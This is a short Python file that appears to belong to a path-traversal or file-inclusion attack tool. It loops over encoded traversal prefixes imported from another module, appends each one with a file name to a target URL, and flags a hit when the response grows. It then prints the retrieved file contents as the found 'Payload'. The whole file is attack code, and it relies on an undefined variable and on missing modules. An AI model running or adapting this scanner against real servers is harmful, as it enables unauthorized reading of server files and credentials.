import requests
import argparse
import sys
from pwn import *
from args import *
from main import *
from preFile import encoded, files


def File_MakeRequest():
    for encode in encoded:
        r1 = requests.get(f"{URL}")
        r2 = requests.get(f"{URL}{encode}{file}")

        if len(r1.content) < len(r2.content):
            colorMessage.success(f"Found file: {file}\n")
            colorMessage.success(f"Payload: {encode}{file} \n ")
            print(r2.text)
            return

    colorMessage.error("No file found")  # executed only if no successful payload is found



